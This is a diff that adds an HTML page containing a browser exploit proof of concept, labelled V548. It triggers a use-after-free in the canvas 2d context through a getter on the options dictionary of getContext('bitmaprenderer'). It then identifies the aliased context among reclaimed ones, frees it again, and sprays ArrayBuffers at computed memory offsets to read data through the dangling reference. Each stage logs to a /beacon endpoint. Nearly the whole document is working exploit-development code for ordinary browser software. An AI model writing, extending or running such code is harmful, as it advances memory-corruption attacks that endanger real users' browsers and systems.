@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V548</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V548-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      innerCtx.lineWidth=11111.11111;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V548-alias-id-and-twostage');
+
+// T1: Alias identification
+// Same-type reclaim then use dangling ref to set unique lineWidth
+// Scan all new contexts to find which one IS the alias
+(function T1(){
+  b('T1-START','alias identification');
+  var ctx=triggerUAF();
+
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var nc=c.getContext('2d');
+    nc.lineWidth=i+1;
+    ctxs.push(nc);
+  }
+  b('T1-RECLAIM','200 ctxs with unique lw');
+
+  // Write unique value through dangling ref
+  ctx.lineWidth=12345.6789;
+  b('T1-SET','lw=12345.6789 via dangling');
+
+  // Find it
+  var found=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===12345.6789){
+      found=i;
+      break;
+    }
+  }
+  if(found>=0){
+    b('T1-FOUND','ctx['+found+'] is alias (orig lw was '+(found+1)+')');
+    // Now we know WHICH context is the alias.
+    // Write via new ref, read via dangling — and vice versa
+    ctxs[found].lineWidth=88888.88;
+    var readback=ctx.lineWidth;
+    b('T1-XREAD','wrote 88888.88 via new, read via dangling='+readback);
+
+    // Test transform R/W (6 doubles)
+    ctxs[found].setTransform(1.1,2.2,3.3,4.4,5.5,6.6);
+    try{
+      var t=ctx.getTransform();
+      b('T1-XFORM','a='+t.a+',b='+t.b+',c='+t.c+',d='+t.d+',e='+t.e+',f='+t.f);
+    }catch(e){b('T1-XFORM-ERR',e.message)}
+  }else{
+    b('T1-NOTFOUND','no ctx has 12345.6789');
+    var s=[];
+    for(var i=0;i<5;i++)s.push(i+':'+ctxs[i].lineWidth);
+    b('T1-SAMPLE',s.join(','));
+  }
+})();
+
+// T2: Two-stage reclaim → delete → AB spray
+// 1. Same-type reclaim (get alias)
+// 2. Identify which context is the alias
+// 3. Delete ONLY that context (detach from canvas)
+// 4. AB spray to reclaim the re-freed slot
+// 5. lineWidth read through dangling ref — reads from AB data!
+//    (m_buffer still points to inline buffer which is now AB data)
+(function T2(){
+  b('T2-START','two-stage reclaim-delete-AB');
+  var ctx=triggerUAF();
+
+  // Stage 1: reclaim
+  var ctxs=[];
+  var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    canvases.push(c);
+    ctxs.push(c.getContext('2d'));
+    ctxs[i].lineWidth=i+1;
+  }
+  b('T2-RECLAIM','200 ctxs');
+
+  // Identify alias
+  ctx.lineWidth=54321.12345;
+  var aliasIdx=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===54321.12345){aliasIdx=i;break}
+  }
+  if(aliasIdx<0){b('T2-NOALIAS','alias not found');return}
+  b('T2-ALIAS','found at idx='+aliasIdx);
+
+  // Stage 2: Delete ONLY the aliased context by replacing it
+  // getContext('bitmaprenderer') on the SAME canvas replaces the 2d context
+  // This frees the 2d context via unique_ptr reset
+  try{
+    canvases[aliasIdx].getContext('bitmaprenderer');
+    b('T2-FREED','replaced 2d with bitmaprenderer on canvas['+aliasIdx+']');
+  }catch(e){b('T2-FREE-ERR',e.message)}
+
+  // Stage 3: AB spray to reclaim the re-freed slot
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    // The old m_stateStack.m_buffer pointed to the inline buffer at
+    // object_addr + 128. That memory is now the AB data at offset 128+.
+    // lineWidth reads from m_buffer + 48 = object_addr + 176
+    // So write our target value at AB offset 176
+    dv.setFloat64(176,77777.77777,true); // little-endian
+    // Also try offset 176 as big-endian
+    dv.setFloat64(168,88888.88888,false);
+    abs.push(ab);
+  }
+  b('T2-SPRAY','300 ABs with lw vals at off168/176');
+
+  // Stage 4: Read through dangling ref
+  // If m_stateStack.m_buffer still valid → reads from AB data
+  b('T2-PRE-LW','about to read lineWidth');
+  try{
+    var lw=ctx.lineWidth;
+    b('T2-LW','!!!SURVIVED!!! val='+lw);
+  }catch(e){b('T2-LW-ERR',e.message)}
+})();
+
+// T3: Same as T2 but different approach to re-freeing
+// Instead of getContext('bitmaprenderer'), set canvas.width=0 to detach
+(function T3(){
+  b('T3-START','two-stage with width=0 detach');
+  var ctx=triggerUAF();
+
+  var ctxs=[];
+  var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    canvases.push(c);
+    ctxs.push(c.getContext('2d'));
+    ctxs[i].lineWidth=i+1;
+  }
+
+  ctx.lineWidth=67890.12345;
+  var aliasIdx=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===67890.12345){aliasIdx=i;break}
+  }
+  if(aliasIdx<0){b('T3-NOALIAS','not found');return}
+  b('T3-ALIAS','idx='+aliasIdx);
+
+  // Null the JS ref to allow GC
+  ctxs[aliasIdx]=null;
+  canvases[aliasIdx].remove(); // remove from DOM
+  canvases[aliasIdx]=null;
+
+  // GC pressure
+  var junk=[];
+  for(var g=0;g<10000;g++)junk.push({x:g});
+  junk=null;
+  for(var g=0;g<5000;g++){var tmp=new ArrayBuffer(1024);tmp=null}
+
+  b('T3-GC','pressure applied');
+
+  // AB spray
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    dv.setFloat64(176,77777.77777,true);
+    abs.push(ab);
+  }
+  b('T3-SPRAY','300 ABs');
+
+  b('T3-PRE-LW','reading lineWidth');
+  try{
+    var lw=ctx.lineWidth;
+    b('T3-LW','!!!val='+lw+'!!!');
+  }catch(e){b('T3-LW-ERR',e.message)}
+})();
+
+b('DONE','V548-all-complete');
+</script>
+</body></html>
